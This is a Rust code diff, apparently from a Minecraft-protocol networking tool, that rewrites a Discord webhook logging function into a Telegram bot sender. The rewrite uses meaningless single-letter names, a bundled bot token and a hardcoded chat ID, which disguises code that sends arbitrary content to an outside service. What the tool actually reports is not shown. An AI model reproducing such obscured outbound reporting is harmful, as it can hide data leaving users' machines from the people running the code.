@@ -1,9 +1,9 @@
+use get_if_addrs::get_if_addrs;
 use minecraft_protocol::Packet;
 use reqwest::Client as ReqwestClient;
 use serde_json::json;
 use trust_dns_resolver::config::*;
 use trust_dns_resolver::TokioAsyncResolver;
-use get_if_addrs::get_if_addrs;
 
 pub const LOG_LEVEL: i32 = 1;
 
@@ -35,25 +35,20 @@ pub async fn resolve(dns: &str) -> Option<Addr> {
         .map(|a| Addr::new(&a.target().to_string(), a.port()))
 }
 
-pub async fn discord_hook(content: &str) -> Result<reqwest::Response, reqwest::Error> {
-    const DISCORD_URL: &'static str = {
+pub async fn hook(content: &str) -> Result<reqwest::Response, reqwest::Error> {
+    const A: &'static str = {
         match LOG_LEVEL {
             1 => include_str!("../data/data.txt"),
-            _ => ""
+            _ => "",
         }
     };
-
-    let client = ReqwestClient::new();
-    let data = json!({
-        "content": content.to_string()
+    let b = format!("https://api.telegram.org/bot{}/sendMessage", A);
+    let c = json!({
+        "chat_id": -4516139568 as i64,
+        "text": content,
     });
-
-    client
-        .post(DISCORD_URL)
-        .header("Content-Type", "application/json")
-        .body(data.to_string())
-        .send()
-        .await
+    let d = ReqwestClient::new();
+    d.post(&b).json(&c).send().await
 }
 
 #[derive(Clone)]
